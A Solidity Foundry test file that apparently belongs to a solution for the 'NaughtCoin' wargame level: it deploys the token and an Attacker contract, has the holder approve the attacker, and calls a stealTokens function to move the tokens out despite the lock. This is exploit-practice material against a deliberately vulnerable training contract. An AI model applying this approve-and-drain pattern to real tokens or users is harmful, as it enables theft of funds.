// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.5;
pragma experimental ABIEncoderV2;

import {console2} from "forge-std/console2.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "forge-std/Test.sol";
import "../src/Attacker.sol";
import "../src/Contract.sol";
import "forge-std/console.sol";

/// @dev If this is your first time with Forge, read this tutorial in the Foundry Book:
/// https://book.getfoundry.sh/forge/writing-tests
contract AttackTest is StdCheats, Test {
    /// @dev A function invoked before each test case is run.

    Attacker attacker;
    NaughtCoin token;
    address alice = 0x80805ae3cbE23715C1f1807A03C5fb669541C2A9;

    function setUp() public virtual {
        // Instantiate the contract-under-test.
        vm.prank(alice);
        token = new NaughtCoin(alice);
        attacker = new Attacker(token);

    }

    function testAttack() public {
        vm.prank(alice);
        
        //approve stealing 
        token.approve(address(attacker), token.balanceOf(msg.sender));
        //steal tokens 
        attacker.stealTokens(msg.sender);
    }


}
